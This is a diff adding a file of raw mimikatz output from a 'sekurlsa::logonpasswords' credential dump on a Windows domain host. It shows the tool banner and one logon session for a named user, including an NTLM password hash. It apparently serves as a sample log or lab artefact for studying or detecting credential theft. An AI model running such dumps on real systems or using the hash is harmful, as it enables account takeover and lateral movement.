@@ -1,0 +1,33 @@
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:11
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 1843627 (00000000:001c1fab)
+Session           : Interactive from 1
+User Name         : marcus.kowalski
+Domain            : VECTORSIGMA
+Logon Server      : DC01
+Logon Time        : 4/13/2026 8:47:32 AM
+SID               : S-1-5-21-3842939050-456128738-1937394857-1142
+        msv :
+         [00000003] Primary
+         * Username : marcus.kowalski
+         * Domain   : VECTORSIGMA
+         * NTLM     : acdb9df2afe2fb27bf9b4b4841b2d0eb
+        tspkg :
+        wdigest :
+         * Username : marcus.kowalski
+         * Domain   : VECTORSIGMA
+         * Password : (null)
+        kerberos :
+         * Username : marcus.kowalski
+         * Domain   : VECTORSIGMA.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
